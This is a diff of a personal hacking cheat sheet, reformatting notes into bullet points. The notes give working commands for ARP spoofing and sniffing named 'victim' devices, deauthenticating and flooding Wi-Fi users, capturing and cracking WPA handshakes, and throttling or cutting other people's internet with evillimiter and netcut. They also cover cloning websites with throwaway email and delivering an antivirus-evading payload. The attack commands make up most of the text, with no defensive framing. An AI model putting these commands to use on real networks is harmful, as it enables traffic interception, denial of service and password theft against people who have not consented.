@@ -341,96 +341,97 @@ max
 
 
 --------------------------------------------------[WHOS CONNECTINIG TO ME]------------------------------------------
+
 [netscanner]
 [angry ip scanner]
 [netdiscover]
-sudo netdiscover -i wlan0 -r 192.168.1.1
+* sudo netdiscover -i wlan0 -r 192.168.1.1
 [KISMET] 
-sudo kismet -c wlan1mon 
+* sudo kismet -c wlan1mon 
 
 [bettercap] - CLI [ettercap] - GUI
-sudo bettercap -caplet http-ui [UI MODE]
-bettercap  -iface wlan0
+* sudo bettercap -caplet http-ui [UI MODE]
+* bettercap  -iface wlan0
 
 [EtterCap - GUI]
-sudo ettercap -G
+* sudo ettercap -G
+* 
 [mitmproxy] 
 
 [commansd]
-net.show [shows whos connected to device]
-net.probe on [probes packetsfor recon]
+* net.show [shows whos connected to device]
+* net.probe on [probes packetsfor recon]
 
-set arp.spoof.targets 192.168.1.10 [sets  spoof to victim]
-set arp.spoof.fullduplex true [sets attack to victim and  host]
-set arp.spoof.targets 192.168.43.157(IP address of the target Device)
-arp.spoof on
+* set arp.spoof.targets 192.168.1.10 [sets  spoof to victim]
+* set arp.spoof.fullduplex true [sets attack to victim and  host]
+* set arp.spoof.targets 192.168.43.157(IP address of the target Device)
+* arp.spoof on
 
-set net.sniff.local true
-net.sniff on
+* set net.sniff.local true
+* net.sniff on
 
 ---------------------------------------------[DISCOVER / DEAUTH USERS]---------------------------------------------
 
 [WASH: networks using the monitor mode interface-- such as printers]
-sudo wash -i wlan2 -c 6 
+* sudo wash -i wlan2 -c 6
+  
 [REAVER: the monitor mode interface (-i mon0) to attack the access point (-b E0:3F:49:6A:57:78), displaying verbose output (-v)]
-reaver -i wlan0mon -b E0:3F:49:6A:57:78 -v
+* reaver -i wlan0mon -b E0:3F:49:6A:57:78 -v
+
 [Use the aireplay to deauth users] 
-aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon
+* aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon
 
 [EVIL LIMITER -- DEAUTH AND LIMIIT BANDWIDHT] #
-git clone https://github.com/bitbrute/evillimiter.git
-cd evillimiter
-sudo python3 setup.py install
-sudo evillimiter
-scan
-limit 1,2,3,4,5,6 200kbit ## LIMIT OR BLOCK NETWORK USERS 
-block 3
-hosts
-free all
 
-sudo wireshark ## to watch network traffic 
-#####################################################
+* git clone https://github.com/bitbrute/evillimiter.git
+* cd evillimiter
+* sudo python3 setup.py install
+* sudo evillimiter
+* scan
+* limit 1,2,3,4,5,6 200kbit ## LIMIT OR BLOCK NETWORK USERS 
+* block 3
+* hosts
+* free all
 
 
-################################################
+[AIRGEDDON] --> [DEAUTH USERS WHEN NOT ON ROUTER]
+* git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
+* cd airgeddon
+* sudo bash airgeddon.sh
 
-[AIRGEDDON] --> DEAUTH USERS WHEN NOT ON ROUTER 
-git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
-cd airgeddon
-sudo bash airgeddon.sh
-################################################
+[wifite]
 
-sudo wifite -all
-
-# Targeting everying near by
-#  Specific Targeting for better information gathering
---> 
+* sudo wifite -all
 
 ----------------------------------------- [BEACON FLOOD - DDOS]
 
-sudo mdk4 wlan0 b "living room"
-airodump-ng wlan0
-[shows devices (mac) within the station]
-airodump-ng -c11 -w airdump.txt -d 50:C7:BF:DC:4C:E8 wlan0
+[mdk4]
+
+* sudo mdk4 wlan0 b "living room"
+
+[airodump] - [shows devices (mac) within the station]
+
+* airodump-ng wlan0
+* airodump-ng -c11 -w airdump.txt -d 50:C7:BF:DC:4C:E8 wlan0
 
 -----------------------------------------[AIRO-DUMP]---------------------------------------
 
 [wifi scan]
-sudo airodump-ng -w wider_scan_capture wlan0 
-sudo airodump-ng -w ap_scan_capture wlan0 -d {AP MAC ADDRESS ^}
+* sudo airodump-ng -w wider_scan_capture wlan0 
+* sudo airodump-ng -w ap_scan_capture wlan0 -d {AP MAC ADDRESS ^}
 
 ##--> RUN Deauth First, and concrunetly run capture handshake 
-# [mdk4 -- deauth] 
-sudo mdk4 wlan0 d -E living room
-sudo aireplay-ng --deauth 0 -a  wlan0
-sudo aireplay-ng -0 0 -a {AP MAC ADDRESS} -c wlan0
+[mdk4 -- deauth] 
+* sudo mdk4 wlan0 d -E living room
+* sudo aireplay-ng --deauth 0 -a  wlan0
+* sudo aireplay-ng -0 0 -a {AP MAC ADDRESS} -c wlan0
 
 # capture handshake [WAIT FOR MESSAGES TO UPDATE]
-sudo airodump-ng -w deauth_capture -c {channel^} -d {AP MAC} wlan0
+* sudo airodump-ng -w deauth_capture -c {channel^} -d {AP MAC} wlan0
 
-# FINALY--> CRACK THE PASSWORD
+# FINALY- CRACK THE PASSWORD
 --> USE WIRESHARK TO EXAMIN .CAP. USE FILTER "eapol" TO FIND HANDSHAKES 
----> aircrack-ng deauth_capture.cap -w wordlist.txt
+*  aircrack-ng deauth_capture.cap -w wordlist.txt
 
 ------------------------------------------[DEAUTH / THROTTLE] --------------------------------------------
 [MORE INFO]
@@ -459,33 +460,32 @@ deauth using  mdk4
 
 -----------------------------------------------------[WIRESHARK - PSK SPY ]------------------------------------------
 
-First enter psk info into : https://www.wireshark.org/tools/wpa-psk.html (Gained from router pass and login) 
+* First enter psk info into : https://www.wireshark.org/tools/wpa-psk.html (Gained from router pass and login) 
 
------------------------------------------------------[TCP-DUMP - PACKET ANAALSYS ]----------------------------------------
+-----------------------------------------------------[TCP-DUMP - PACKET ANAALSYS 
 [tcpdump] -> captures traffic from all layeres of OSI MOdel. YOu can store and analyze the data, and analayze it later, on wireshark
 
 -----------------------------------------------------[LIMIT-BANDWIDTH]----------------------------------------
 [netcut] -->A simple tool to ban people's Internet connection with ARP spoofing.
-https://github.com/cdes5804/NetCut
-cd and make file
+* https://github.com/cdes5804/NetCut
 
 ----------------------------------------------------[tracking domain]---------------------------------------------
 
-ping [ping with both 'www' and naked domain
-nslookup [[ping with both 'www' and naked domain]
-use censys to find history between server, origin and destination. 
-[https://github.com/censys/censys-python]
+* ping [ping with both 'www' and naked domain
+* nslookup [[ping with both 'www' and naked domain]
+* use censys to find history between server, origin and destination. 
+* [https://github.com/censys/censys-python]
 
-------------------------------------------[DNS and reverse DNS lookup]----------------------------------------------------------------------
-$ dig compass-security.com
-$ dig -x 10.5.23.42
+---------------------------------------[DNS and reverse DNS lookup]-----------------------------------------
+* dig compass-security.com
+* dig -x 10.5.23.42
 
 ----------------------------------------------[COPY WEBPAGE ] -------------------------------------------------]
-sudo apt install httrack webhttrack
-httprack -w domain.com
-tempmailer.de --> Use throw away email 
+* sudo apt install httrack webhttrack
+* httprack -w domain.com
+* tempmailer.de --> Use throw away email 
 
-----------------------------------------------[Windows Defender Payload] -------------------------------------------------]
+----------------------------------------------[Windows Defender Payload] -----------------------------------]
 [dsviper] 
 enter info
 create python server to deliver payload 
